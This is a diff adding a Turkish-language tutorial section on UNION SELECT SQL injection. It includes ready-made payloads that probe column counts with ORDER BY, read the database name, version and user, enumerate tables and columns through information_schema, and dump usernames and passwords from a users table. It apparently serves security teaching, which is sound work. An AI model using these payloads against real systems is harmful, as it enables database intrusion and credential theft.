@@ -82,6 +82,83 @@ SQL Injection, uygulamanın verdiği geri bildirim veya veri tabanı ile olan et
 ` ' UNION SELECT username, password FROM users-- `
 - **Avantaj:** Direkt veri dökümü yapılabilir.
 - **Dezavantaj:** Kolon sayısı bilinmeli.
+```
+## 🔗 UNION SELECT ile Veri Çekme
+
+SQL Injection’da **UNION SELECT** kullanarak birden fazla sorguyu birleştirip veritabanından veri çekmek yaygın bir tekniktir.  
+
+Örnek payload:
+```
+ford' UNION SELECT database(), version(), user(), 4 #
+```
+
+### 🔹 Açıklamalar
+1. **`database()`**  
+- Hedef veritabanının adını döndürür.  
+- Örnek çıktı: `shop_db`  
+
+2. **`version()`**  
+- Veritabanı motorunun sürümünü gösterir.  
+- Örnek çıktı: `5.7.38-log`  
+
+3. **`user()`**  
+- Mevcut veritabanı kullanıcısını döndürür.  
+- Örnek çıktı: `root@localhost`  
+
+4. **Sabit değer (`4`)**  
+- UNION SELECT’de kolon sayısını eşitlemek için kullanılır.  
+- Örnek: Eğer orijinal sorguda 4 kolon varsa, sabit bir değer vererek hata almayı önleriz.  
+
+---
+
+### 🔹 Örnek Adımlar
+1. Hedef URL parametresi belirlenir:
+```
+http://hedef.com/product.php?id=1
+```
+2. Kolon sayısını öğrenmek için ORDER BY veya NULL test edilir:
+```
+1' ORDER BY 1--  
+1' ORDER BY 2--  
+1' ORDER BY 3--  
+1' ORDER BY 4--  # hata yok → 4 kolon var
+```
+3. UNION SELECT ile veriler çekilir:
+```
+1' UNION SELECT database(), version(), user(), null-- 
+```
+
+---
+
+### 🔹 Ekstra Örnekler
+- Tabloları listeleme:
+```
+' UNION SELECT table_name, null, null, null FROM information_schema.tables-- 
+```
+- Kolonları listeleme:
+```
+' UNION SELECT column_name, null, null, null FROM information_schema.columns WHERE table_name='users'--
+```
+- Belirli kolon verilerini çekme:
+```
+' UNION SELECT username, password, null, null FROM users--
+```
+
+---
+
+### 📌 Notlar
+- UNION SELECT kullanabilmek için **kolon sayısı eşit olmalı** ve veri tipleri uyumlu olmalı.  
+- Sabit değerler (`null`, `0`, `'a'`) ile eksik kolonlar tamamlanabilir.  
+- Bu teknik sadece **error-based SQLi veya WAF filtresi olmayan sistemlerde** rahat çalışır.  
+- Hedef veritabanı türüne göre fonksiyonlar değişebilir:
+  - MySQL: `database()`, `version()`, `user()`  
+  - MSSQL: `DB_NAME()`, `@@VERSION`, `SYSTEM_USER`  
+  - PostgreSQL: `current_database()`, `version()`, `current_user`  
+  - Oracle: `USER`, `V$VERSION`  
+
+> UNION SELECT, SQLi derslerinde veri çıkarma mantığını öğrenmek için temel ve kritik bir tekniktir.
+```
+
 
 ### 4️⃣ Out-of-Band SQLi
 - **Tanım:** Veri doğrudan HTTP cevabında değil, DNS veya HTTP isteği ile saldırgana iletilir.
